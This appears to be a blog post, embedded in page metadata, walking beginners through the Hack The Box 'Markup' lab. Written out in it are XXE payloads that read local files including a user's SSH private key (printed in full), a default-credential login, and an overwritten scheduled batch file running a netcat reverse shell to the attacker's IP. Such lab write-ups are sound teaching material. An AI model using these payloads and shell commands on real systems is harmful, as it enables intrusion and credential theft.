<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Markup - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,markup,tier-2,vip-tier,web,injection,apache,ssh,php,reconnaissance,scheduled-job-abuse,weak-credentials,arbitrary-file-upload,xxe-injection,weak-permissions"><meta name=description content="The aim of this walkthrough is to provide help with the Markup machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/markup/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Markup - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Markup machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/markup/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-24T08:00:00+00:00"><meta property="article:modified_time" content="2023-05-24T08:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Markup - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Markup machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Markup - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/markup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Markup - Walkthrough","name":"HTB - Markup - Walkthrough","description":"The aim of this walkthrough is to provide help with the Markup machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","markup","tier-2","vip-tier","web","injection","apache","ssh","php","reconnaissance","scheduled-job-abuse","weak-credentials","arbitrary-file-upload","xxe-injection","weak-permissions"],"articleBody":"The aim of this walkthrough is to provide help with the Markup machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: What version of Apache is running on the target’s port 80?\nA nice way to kick off our recon phase is with a quick connection check\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ ping $rhost -c 4 PING 10.129.113.61 (10.129.113.61) 56(84) bytes of data. 64 bytes from 10.129.113.61: icmp_seq=1 ttl=127 time=11.1 ms 64 bytes from 10.129.113.61: icmp_seq=2 ttl=127 time=10.3 ms 64 bytes from 10.129.113.61: icmp_seq=3 ttl=127 time=9.71 ms 64 bytes from 10.129.113.61: icmp_seq=4 ttl=127 time=9.97 ms --- 10.129.113.61 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 9.708/10.281/11.131/0.535 ms ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ followed by the usual (version, script, top ports) tcp scan.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ nmap -sC -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 10:35 BST Nmap scan report for 10.129.113.61 Host is up (0.012s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0) | ssh-hostkey: | 3072 9fa0f78cc6e2a4bd718768823e5db79f (RSA) | 256 907d96a96e9e4d4094e7bb55ebb30b97 (ECDSA) |_ 256 f910eb76d46d4f3e17f393d60b8c4b81 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28 |_http-title: MegaShopping 443/tcp open ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 | tls-alpn: |_ http/1.1 |_http-title: MegaShopping |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.82 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ It looks like we have a windows target on our hands with three ports reported open:\nport 22 – ssh port 80 – apache web server port 443 – apache web server Given that there is a website hosted by the target, we check it’s fingerprint.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ whatweb http://$rhost/ http://10.129.113.61/ [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28], IP[10.129.113.61], OpenSSL[1.1.1c], PHP[7.2.28], PasswordField[password], PoweredBy[Megacorp], Script, Title[MegaShopping], X-Powered-By[PHP/7.2.28] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ whatweb https://$rhost/ https://10.129.113.61/ [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28], IP[10.129.113.61], OpenSSL[1.1.1c], PHP[7.2.28], PasswordField[password], PoweredBy[Megacorp], Script, Title[MegaShopping], X-Powered-By[PHP/7.2.28] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ The fingerprint we get back is identical for the two ports 80 and 443.\n2.4.41\nTASK 2 Question: What username:password combination logs in successfully?\nIt’s time to fire up our browser and take a look at the hosted website. It looks like an online shop.\nTrying out some of the default login credentials for windows systems does prove successful.\ndefault credentials username admin password password We log in using the admin:password pair.\nadmin:password\nTASK 3 Question: What is the word at the top of the page that accepts user input?\nGoofing around a bit on the website, these are the observations we might note:\nthe Contact field appears to be offline (not working) submitting an Order results in a pop-up window order\nTASK 4 Question: What XML version is used on the target?\nPressing [ctrl+u] in Firefox should enable us a look at the Page Source. Looking over the code which belongs to - http://$rhost/services.php - provides us with the answer.\n1.0\nTASK 5 Question: What does the XXE / XEE attack acronym stand for?\nIt is time to do some online research. There are two very nice pages both on the portswigger website: one introducing XML entities and the second one describing XEE injections.\nxml external entity\nTASK 6 Question: What username can we find on the webpage’s HTML code?\nThere is a comment in the page source belonging to the services page.\n... ... daniel\nTASK 7 Question: What is the file located in the Log-Management folder on the target?\nIt is time to finally take a closer look at the found XEE vulnerability. We can do this by:\nfiring up burp suite on our pwnbox and turning on intercept in the proxy tab turning on the FoxyProxy extension in our Firefox to intercept communication and forward it to burp submitting an order with some test data sending intercepted http request to burp repeater This is what the end result could look like:\nLooking over the research we did in TASK5, there is only one type of XXE attack which is of importance for us right now:\nExploiting XXE to retrieve files So test it if our target is vulnerable, let’s try and leak our it’s host file. This is our original xml document.\n# original \u003c?xml version = \"1.0\"?\u003e1Home Appliancestestaddress Adjusting it - given that our target is running a windows system - we have three different XEE payloads with the different data values to play around with.\n# modified XXE payload - quantity data value \u003c?xml version = \"1.0\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\"\u003e ]\u003e \u0026xxe;Home Appliancestestaddress # modified XXE payload - item data value \u003c?xml version = \"1.0\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\"\u003e ]\u003e 1\u0026xxe;testaddress # modified XXE payload - address data value \u003c?xml version = \"1.0\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\"\u003e ]\u003e 1Home Appliances\u0026xxe; Trying out the quantity data value seems unsuccessful.\nBut using the item data value appears to be working and we can successfully leak our target’s host file.\nNow that we are able to leak and read information from our target, our next course of action should be to look for any authentication information which we can then leverage to build a better connection to our target.\nPutting the pieces together,\nssh service is running on port 22 – TASK1 potential user daniel – TASK6 we try and leak the aforementioned user’s private ssh key. A quick online search provides us with the following potential path: C:\\Users\\\\. ssh\\id_rsa.\nWith the adjusted XXE payload\n\u003c?xml version = \"1.0\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"file:///c:/users/daniel/.ssh/id_rsa\"\u003e ]\u003e 1\u0026xxe;testaddress in burp\nwe can successfully leak daniel’s private ssh key.\nThis is how daniel’s private ssh key looks like:\n# daniel's private ssh key -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- And now all that’s left is to prepare it for the ssh connection.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ vim id_rsa ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ ll total 4.0K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 2.6K May 24 13:05 id_rsa ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ chmod 600 id_rsa ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ ll total 4.0K -rw------- 1 htb-bluewalle htb-bluewalle 2.6K May 24 13:05 id_rsa ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ Connecting to our target with - ssh -i id_rsa daniel@$rhost - results in us getting the user flag.\nMicrosoft Windows [Version 10.0.17763.107] daniel@MARKUP C:\\Users\\daniel\u003ewhoami markup\\daniel daniel@MARKUP C:\\Users\\daniel\u003edir Volume in drive C has no label. Volume Serial Number is BA76-B4E3 Directory of C:\\Users\\daniel 10/13/2021 04:43 PM . 10/13/2021 04:43 PM .. 03/05/2020 06:19 AM .ssh 03/05/2020 07:18 AM Desktop 04/21/2020 03:34 AM Documents 09/15/2018 12:12 AM Downloads 09/15/2018 12:12 AM Favorites 09/15/2018 12:12 AM Links 09/15/2018 12:12 AM Music 09/15/2018 12:12 AM Pictures 09/15/2018 12:12 AM Saved Games 09/15/2018 12:12 AM Videos 0 File(s) 0 bytes 12 Dir(s) 7,389,384,704 bytes free daniel@MARKUP C:\\Users\\daniel\u003ecd Desktop daniel@MARKUP C:\\Users\\daniel\\Desktop\u003edir Volume in drive C has no label. Volume Serial Number is BA76-B4E3 Directory of C:\\Users\\daniel\\Desktop 03/05/2020 07:18 AM . 03/05/2020 07:18 AM .. 03/05/2020 07:18 AM 35 user.txt 1 File(s) 35 bytes 2 Dir(s) 7,389,384,704 bytes free daniel@MARKUP C:\\Users\\daniel\\Desktop\u003etype user.txt daniel@MARKUP C:\\Users\\daniel\\Desktop\u003e Goofing around a bit, we notice the job.bat file.\ndaniel@MARKUP C:\\Users\\daniel\\Desktop\u003ecd .. daniel@MARKUP C:\\Users\\daniel\u003ecd .. daniel@MARKUP C:\\Users\u003edir Volume in drive C has no label. Volume Serial Number is BA76-B4E3 Directory of C:\\Users 03/05/2020 05:40 AM . 03/05/2020 05:40 AM .. 07/28/2021 12:56 AM Administrator 10/13/2021 09:16 AM daniel 03/05/2020 05:11 AM Public 0 File(s) 0 bytes 5 Dir(s) 7,389,384,704 bytes free daniel@MARKUP C:\\Users\u003ecd .. daniel@MARKUP C:\\\u003edir Volume in drive C has no label. Volume Serial Number is BA76-B4E3 Directory of C:\\ 03/12/2020 03:56 AM Log-Management 09/15/2018 12:12 AM PerfLogs 07/28/2021 02:01 AM Program Files 09/15/2018 12:21 AM Program Files (x86) 07/28/2021 03:38 AM 0 Recovery.txt 03/05/2020 05:40 AM Users 07/28/2021 02:16 AM Windows 03/05/2020 10:15 AM xampp 1 File(s) 0 bytes 7 Dir(s) 7,389,384,704 bytes free daniel@MARKUP C:\\\u003etype Recovery.txt daniel@MARKUP C:\\\u003ecd Log-Management daniel@MARKUP C:\\Log-Management\u003edir Volume in drive C has no label. Volume Serial Number is BA76-B4E3 Directory of C:\\Log-Management 03/12/2020 03:56 AM . 03/12/2020 03:56 AM .. 03/06/2020 02:42 AM 346 job.bat 1 File(s) 346 bytes 2 Dir(s) 7,389,384,704 bytes free daniel@MARKUP C:\\Log-Management\u003e job.bat\nTASK 8 Question: What executable is mentioned in the file mentioned before?\nLet’s check it out.\ndaniel@MARKUP C:\\Log-Management\u003etype job.bat @echo off FOR /F \"tokens=1,2*\" %%V IN ('bcdedit') DO SET adminTest=%%V IF (%adminTest%)==(Access) goto noAdmin for /F \"tokens=*\" %%G in ('wevtutil.exe el') DO (call :do_clear \"%%G\") echo. echo Event Logs have been cleared! goto theEnd :do_clear wevtutil.exe cl %1 goto :eof :noAdmin echo You must run this script as an Administrator! :theEnd exit daniel@MARKUP C:\\Log-Management\u003e Looking up wevutil we find the following:\nEnables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. Checking out the mentioned parameters leaves us with:\nParameter Description {el | enum-logs} Displays the names of all logs. {cl | clear-log} [/bu:] Clears events from the specified event log. The /bu option can be used to back up the cleared events. So in a nutshell, running the script with administrator privileges clears up some event logs. But what of it’s permissions? We can use icacls to display it’s access control list.\ndaniel@MARKUP C:\\Log-Management\u003eicacls job.bat job.bat BUILTIN\\Users:(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(RX) Successfully processed 1 files; Failed processing 0 files daniel@MARKUP C:\\Log-Management\u003e The (F) at the top stands for Full access, which gives us permissions to modify however we see it fit.\nwevtutil.exe\nSUBMIT FLAG Question: Submit user flag\nIt was already acquired during TASK7.\nflag\nSUBMIT FLAG Question: Submit root flag\nOur main idea to get to the root flag is to leverage our full access privileges on the job.bat file to run a reverse root/admin shell connecting back to our pwnbox. The prerequisite for this is of course, that job.bat is already on schedule to be run by the system (periodically with administrator privileges).\nBreaking it down:\nCopying a netcat binary to our target (from pwnbox, since our target is not connected to the internet). Starting a netcat listener on the attacking machine. Overwriting job.bat to run a reverse shell. Waiting for the reverse shell to connect back (on lhost). So let’s jump right into it.\nStep 1: We download the netcat binary to the pwnbox.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe --2023-05-24 17:10:37-- https://github.com/int0x33/nc.exe/raw/master/nc64.exe Resolving github.com (github.com)... 140.82.121.3 Connecting to github.com (github.com)|140.82.121.3|:443... connected. HTTP request sent, awaiting response... 302 Found Location: https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe [following] --2023-05-24 17:10:38-- https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ... Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 45272 (44K) [application/octet-stream] Saving to: ‘nc64.exe’ nc64.exe 100%[=============================\u003e] 44.21K --.-KB/s in 0.001s 2023-05-24 17:10:38 (44.5 MB/s) - ‘nc64.exe’ saved [45272/45272] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ Then we host it by utilizing the http.server python module\n# on lhost ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ ll total 52K -rw------- 1 htb-bluewalle htb-bluewalle 2.6K May 24 16:19 id_rsa -rw-r--r-- 1 htb-bluewalle htb-bluewalle 45K May 24 17:10 nc64.exe ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ python -m http.server 4444 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ... and use wget (in powershell) on our target to download it.\n# on rhost daniel@MARKUP C:\\Log-Management\u003eping 1.1.1.1 Pinging 1.1.1.1 with 32 bytes of data: Control-C ^C daniel@MARKUP C:\\Log-Management\u003epowershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Log-Management\u003e wget http://10.10.14.75:4444/nc64.exe wget : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. At line:1 char:1 + wget http://10.10.14.75:4444/nc64.exe + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Comma nds.InvokeWebRequestCommand PS C:\\Log-Management\u003e wget http://10.10.14.75:4444/nc64.exe -OutFile nc64.exe PS C:\\Log-Management\u003e ls Directory: C:\\Log-Management Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/6/2020 1:42 AM 346 job.bat -a---- 5/24/2023 9:15 AM 45272 nc64.exe PS C:\\Log-Management\u003e Step 2: Running the netcat listener on lhost.\n─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Step 3: Overwriting the job.bat file on rhost.\ndaniel@MARKUP C:\\Log-Management\u003edir Volume in drive C has no label. Volume Serial Number is BA76-B4E3 Directory of C:\\Log-Management 05/24/2023 09:15 AM . 05/24/2023 09:15 AM .. 03/06/2020 02:42 AM 346 job.bat 05/24/2023 09:15 AM 45,272 nc64.exe 2 File(s) 45,618 bytes 2 Dir(s) 7,367,720,960 bytes free daniel@MARKUP C:\\Log-Management\u003eecho C:\\Log-Management\\nc64.exe -e cmd.exe 10.10.14.75 4444 \u003e job.bat daniel@MARKUP C:\\Log-Management\u003etype job.bat C:\\Log-Management\\nc64.exe -e cmd.exe 10.10.14.75 4444 daniel@MARKUP C:\\Log-Management\u003e Step 4: Waiting for the reverse admin shell on lhost.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-fr9bvosx8o]─[~/markup] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.113.61. Ncat: Connection from 10.129.113.61:49675. Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003e Great, since we already have a root/admin shell up and running, we can finish it up by grabbing the root flag.\nC:\\Windows\\system32\u003ecd C:\\Users\\Administrator\\Desktop\\ cd C:\\Users\\Administrator\\Desktop\\ C:\\Users\\Administrator\\Desktop\u003edir dir Volume in drive C has no label. Volume Serial Number is BA76-B4E3 Directory of C:\\Users\\Administrator\\Desktop 03/05/2020 07:33 AM . 03/05/2020 07:33 AM .. 03/05/2020 07:33 AM 70 root.txt 1 File(s) 70 bytes 2 Dir(s) 7,366,606,848 bytes free C:\\Users\\Administrator\\Desktop\u003etype root.txt type root.txt C:\\Users\\Administrator\\Desktop\u003e flag\nCongratulations, we just successfully pwned the target machine. All we have left to do now is to terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"2494","inLanguage":"en","datePublished":"2023-05-24T08:00:00Z","dateModified":"2023-05-24T08:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/markup/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body 